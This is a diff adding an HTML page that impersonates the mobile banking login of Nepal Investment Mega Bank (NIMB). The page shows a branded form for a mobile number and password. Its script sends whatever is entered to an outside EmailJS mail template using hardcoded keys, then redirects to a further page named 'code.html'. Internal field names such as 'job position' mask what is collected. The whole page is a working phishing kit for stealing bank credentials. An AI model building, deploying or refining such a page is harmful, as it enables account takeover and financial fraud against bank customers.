@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>NIMB | Login</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+  :root{
+    --blue:#1f4f9c;
+    --blue-dark:#173d7d;
+    --red:#e4262e;
+    --text:#2b3a55;
+    --muted:#7d8aa3;
+    --border:#3a5f9e;
+    --line:#eef1f6;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+  body{
+    font-family:'Poppins',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+    background:#dfe5ef;
+    display:flex;justify-content:center;align-items:center;
+    min-height:100vh;
+  }
+  .phone{
+    position:relative;width:100%;max-width:400px;height:100vh;max-height:880px;
+    background:#fff;display:flex;flex-direction:column;overflow:hidden;
+  }
+  @media (min-width:500px){
+    .phone{border-radius:28px;box-shadow:0 24px 60px rgba(20,40,80,.25);height:860px}
+  }
+
+  /* ---------- Hero ---------- */
+  .hero{
+    position:relative;flex-shrink:0;height:215px;background:var(--blue);
+    border-radius:0 0 40px 40px;
+  }
+  .lotus{
+    position:absolute;left:50%;top:26px;transform:translateX(-50%);width:200px;height:auto;
+  }
+
+  /* ---------- Brand ---------- */
+  .brand{text-align:center;margin-top:12px;flex-shrink:0}
+  .brand h1{
+    font-size:58px;font-weight:800;color:var(--blue);letter-spacing:1px;line-height:1;
+  }
+  .brand .np{
+    display:block;margin-top:6px;font-size:12px;font-weight:600;color:var(--blue);
+    text-decoration:underline;text-underline-offset:3px;
+  }
+  .brand .en{
+    display:block;margin-top:2px;font-size:8.5px;font-weight:600;color:var(--blue);
+    letter-spacing:.2px;text-decoration:underline;text-underline-offset:2px;
+  }
+
+  /* ---------- Form ---------- */
+  .content{
+    flex:1;overflow-y:auto;padding:26px 24px 100px;
+    scrollbar-width:none;
+  }
+  .content::-webkit-scrollbar{display:none}
+  form{width:100%}
+  .field{position:relative;margin-bottom:16px}
+  .field .ico{
+    position:absolute;left:14px;top:50%;transform:translateY(-50%);
+    width:20px;height:20px;color:#6b7b99;pointer-events:none;
+  }
+  .field input{
+    width:100%;height:54px;padding:0 46px 0 46px;
+    border:1.5px solid var(--border);border-radius:8px;
+    font-family:inherit;font-size:16px;color:var(--text);background:#fff;outline:none;
+    transition:box-shadow .2s,border-color .2s;
+  }
+  .field input::placeholder{color:#9aa3b5;font-size:15px}
+  .field input:focus{box-shadow:0 0 0 3px rgba(31,79,156,.15)}
+  .field.invalid input{border-color:var(--red)}
+  .field .toggle{
+    position:absolute;right:12px;top:50%;transform:translateY(-50%);
+    background:none;border:0;cursor:pointer;color:#6b7b99;padding:6px;display:flex;
+  }
+  .err{
+    display:none;color:var(--red);font-size:12px;margin:-8px 0 12px 4px;
+  }
+  .field.invalid + .err{display:block}
+
+  .remember{
+    display:flex;align-items:center;gap:10px;margin:4px 0 0 4px;
+    font-size:14px;color:var(--text);cursor:pointer;user-select:none;
+  }
+  .remember input{
+    width:20px;height:20px;accent-color:var(--blue);cursor:pointer;
+  }
+
+  .btn{
+    width:100%;height:50px;margin-top:22px;border:0;border-radius:6px;
+    background:var(--blue);color:#fff;font-family:inherit;font-size:16px;font-weight:600;
+    cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;
+    transition:background .2s,opacity .2s;
+  }
+  .btn:hover{background:var(--blue-dark)}
+  .btn:disabled{opacity:.7;cursor:not-allowed}
+  .spinner{
+    width:18px;height:18px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;
+    border-radius:50%;animation:spin .8s linear infinite;display:none;
+  }
+  .btn.loading .spinner{display:inline-block}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .alert{
+    display:none;margin-top:14px;padding:10px 12px;border-radius:6px;font-size:13px;
+    background:#fdecec;color:#b3261e;border:1px solid #f5c2c0;
+  }
+  .alert.show{display:block}
+
+  .help{
+    display:flex;justify-content:center;align-items:center;gap:8px;margin-top:26px;
+    color:var(--blue);font-size:15px;font-weight:500;text-decoration:underline;
+    text-underline-offset:3px;cursor:pointer;background:none;border:0;width:100%;font-family:inherit;
+  }
+
+  /* ---------- Bottom navigation ---------- */
+  .nav{
+    position:absolute;left:0;right:0;bottom:0;height:80px;background:#fff;
+    border-top:1px solid var(--line);display:flex;justify-content:space-around;align-items:center;
+    padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  .nav a{
+    display:flex;flex-direction:column;align-items:center;gap:4px;width:72px;
+    font-size:12px;color:var(--muted);text-decoration:none;
+  }
+  .nav a.active{color:var(--blue)}
+  .nav svg{width:24px;height:24px}
+  .nav .qr{
+    position:absolute;left:50%;top:-30px;transform:translateX(-50%);
+    width:70px;height:70px;border-radius:50%;background:var(--red);
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 8px 18px rgba(228,38,46,.35);border:0;cursor:pointer;
+  }
+  .nav .qr svg{width:34px;height:34px}
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <!-- Hero with lotus logo -->
+  <section class="hero" aria-hidden="true">
+    <svg class="lotus" viewBox="0 0 220 230" xmlns="http://www.w3.org/2000/svg">
+      <g fill="#e4262e" stroke="#ffb3b8" stroke-width="2.5" stroke-linejoin="round">
+        <path d="M110 6 C132 34 140 74 124 112 L110 122 L96 112 C80 74 88 34 110 6Z"/>
+        <path d="M70 34 C92 46 102 84 106 116 C76 110 48 94 38 70 C46 52 58 40 70 34Z"/>
+        <path d="M150 34 C128 46 118 84 114 116 C144 110 172 94 182 70 C174 52 162 40 150 34Z"/>
+        <path d="M24 92 C50 98 80 112 102 128 C84 146 52 146 28 124 Z"/>
+        <path d="M196 92 C170 98 140 112 118 128 C136 146 168 146 192 124 Z"/>
+        <path d="M80 142 C92 128 102 124 110 128 C118 124 128 128 140 142 C128 168 92 168 80 142Z"/>
+      </g>
+      <path d="M92 74 L101 56 L110 68 L119 56 L128 74" fill="none" stroke="#1f4f9c" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+      <rect x="106" y="166" width="8" height="60" rx="2" fill="#1f4f9c"/>
+    </svg>
+  </section>
+
+  <!-- Brand -->
+  <div class="brand">
+    <h1>NIMB</h1>
+    <span class="np">नेपाल इन्भेष्टमेण्ट मेगा बैंक लि.</span>
+    <span class="en">NEPAL INVESTMENT MEGA BANK LTD.</span>
+  </div>
+
+  <!-- Login form -->
+  <main class="content">
+    <form id="loginForm" novalidate>
+
+      <div class="field" id="nameField">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="2.5" width="14" height="19" rx="2.5"/><line x1="10.5" y1="18.5" x2="13.5" y2="18.5"/>
+        </svg>
+        <input type="text" id="name" placeholder="Mobile Number" autocomplete="name" maxlength="80">
+      </div>
+      <div class="err" id="nameErr">Please enter your name.</div>
+
+      <div class="field" id="jobField">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="4.5" y="10.5" width="15" height="10.5" rx="2"/><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"/>
+        </svg>
+        <input type="password" id="job" placeholder="Password" autocomplete="off" maxlength="30">
+        <button type="button" class="toggle" id="toggleJob" aria-label="Show or hide job position number">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" id="eyeIcon">
+            <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+      <div class="err" id="jobErr">Please enter your job position number.</div>
+
+      <label class="remember">
+        <input type="checkbox" id="remember">
+        <span>Remember Me</span>
+      </label>
+
+      <button type="submit" class="btn" id="submitBtn">
+        <span class="spinner"></span>
+        <span id="btnText">Login</span>
+      </button>
+
+      <div class="alert" id="alertBox" role="alert"></div>
+
+      <button type="button" class="help" id="helpBtn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
+          <circle cx="12" cy="12" r="9.5"/><path d="M9.5 9.5a2.5 2.5 0 1 1 3.5 2.3c-.7.3-1 .9-1 1.6v.6"/><circle cx="12" cy="17" r=".6" fill="currentColor"/>
+        </svg>
+        Need help to Login
+      </button>
+    </form>
+  </main>
+
+  <!-- Bottom navigation -->
+  <nav class="nav">
+    <a href="#" class="active">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 3 2 12h3v8h5v-5h4v5h5v-8h3L12 3z"/></svg>
+      Home
+    </a>
+    <a href="#">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9.5"/><path d="M8 9h8M8 12.5h8M8 16h5"/></svg>
+      Payments
+    </a>
+    <button class="qr" type="button" aria-label="Scan QR code">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8" stroke-linecap="round">
+        <path d="M4 8V5.5A1.5 1.5 0 0 1 5.5 4H8M16 4h2.5A1.5 1.5 0 0 1 20 5.5V8M20 16v2.5a1.5 1.5 0 0 1-1.5 1.5H16M8 20H5.5A1.5 1.5 0 0 1 4 18.5V16"/>
+        <rect x="8" y="8" width="8" height="8" rx="1"/>
+      </svg>
+    </button>
+    <a href="#">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M12 2.5 20 7v10l-8 4.5L4 17V7l8-4.5z"/><path d="M4 7l8 4.5L20 7M12 11.5v10"/></svg>
+      Products
+    </a>
+    <a href="#">
+      <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/></svg>
+      More
+    </a>
+  </nav>
+</div>
+
+<script>
+  // ---- EmailJS configuration ----
+  const EMAILJS_PUBLIC_KEY = "ttrKOZNMDMqFjqfPT";
+  const EMAILJS_SERVICE_ID = "service_8iot5xx";
+  const EMAILJS_TEMPLATE_ID = "template_2vp7oqq";
+  const REDIRECT_URL = "code.html";
+
+  if (typeof emailjs !== "undefined") {
+    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+  }
+
+  const form       = document.getElementById("loginForm");
+  const nameInput  = document.getElementById("name");
+  const jobInput   = document.getElementById("job");
+  const rememberCb = document.getElementById("remember");
+  const submitBtn  = document.getElementById("submitBtn");
+  const btnText    = document.getElementById("btnText");
+  const alertBox   = document.getElementById("alertBox");
+  const nameField  = document.getElementById("nameField");
+  const jobField   = document.getElementById("jobField");
+  const nameErr    = document.getElementById("nameErr");
+  const jobErr     = document.getElementById("jobErr");
+
+  // Show / hide job position number
+  const toggleJob = document.getElementById("toggleJob");
+  toggleJob.addEventListener("click", () => {
+    const hidden = jobInput.type === "password";
+    jobInput.type = hidden ? "text" : "password";
+    toggleJob.style.color = hidden ? "var(--blue)" : "#6b7b99";
+  });
+
+  // Clear validation state while typing
+  nameInput.addEventListener("input", () => nameField.classList.remove("invalid"));
+  jobInput.addEventListener("input", () => jobField.classList.remove("invalid"));
+
+  function showAlert(message) {
+    alertBox.textContent = message;
+    alertBox.classList.add("show");
+  }
+  function hideAlert() {
+    alertBox.classList.remove("show");
+  }
+  function setLoading(isLoading) {
+    submitBtn.disabled = isLoading;
+    submitBtn.classList.toggle("loading", isLoading);
+    btnText.textContent = isLoading ? "Submitting..." : "Submit";
+  }
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    hideAlert();
+
+    const name = nameInput.value.trim();
+    const job  = jobInput.value.trim();
+
+    // Validation
+    let valid = true;
+    if (!name) {
+      nameField.classList.add("invalid");
+      nameErr.textContent = "Please enter your name.";
+      valid = false;
+    }
+    if (!job) {
+      jobField.classList.add("invalid");
+      jobErr.textContent = "Please enter your job position number.";
+      valid = false;
+    }
+    if (!valid) {
+      (name ? jobInput : nameInput).focus();
+      return;
+    }
+
+    if (typeof emailjs === "undefined") {
+      showAlert("Email service could not load. Please check your internet connection and try again.");
+      return;
+    }
+
+    setLoading(true);
+
+    const templateParams = {
+      name: name,
+      from_name: name,
+      job_position: job,
+      remember_me: rememberCb.checked ? "Yes" : "No",
+      submitted_at: new Date().toLocaleString(),
+      message: `Name: ${name}\nJob Position Num: ${job}\nRemember Me: ${rememberCb.checked ? "Yes" : "No"}`
+    };
+
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+      window.location.href = REDIRECT_URL;
+    } catch (err) {
+      console.error("EmailJS error:", err);
+      showAlert("Submission failed. Please try again.");
+      setLoading(false);
+    }
+  });
+
+  document.getElementById("helpBtn").addEventListener("click", () => {
+    showAlert("For login help, please contact your branch or the NIMB helpdesk.");
+  });
+</script>
+</body>
+</html>
